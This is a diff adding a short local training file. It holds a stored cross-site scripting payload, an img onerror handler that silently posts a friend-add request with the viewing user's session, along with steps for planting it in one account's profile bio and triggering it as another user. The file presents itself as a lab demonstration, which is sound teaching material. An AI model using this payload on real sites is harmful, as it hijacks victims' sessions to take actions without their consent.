@@ -1,0 +1,6 @@
+LOCAL TRAINING PAYLOAD — paste ONLY into Sam Attacker's About Me field.
+The payload is an illustrative same-origin action using the vulnerable user's session; no data leaves localhost.
+
+<img src=x onerror="fetch('friend_add.php',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'friend_id=3',credentials:'same-origin'}).then(()=>document.body.insertAdjacentHTML('beforeend','<div style=&quot;position:fixed;bottom:10px;right:10px;background:#163;padding:12px;color:white;border-radius:8px;z-index:9999&quot;>Stored XSS executed: attempted friend add</div>'))">
+
+Demo: Login as Sam, save this in profile bio. Logout; login as Alice; browse Sam's profile. Refresh page or use phpMyAdmin SELECT * FROM friendships WHERE user_id=1 AND friend_id=3. The body text must be stored in the database first. Note: do not use real victim credentials.
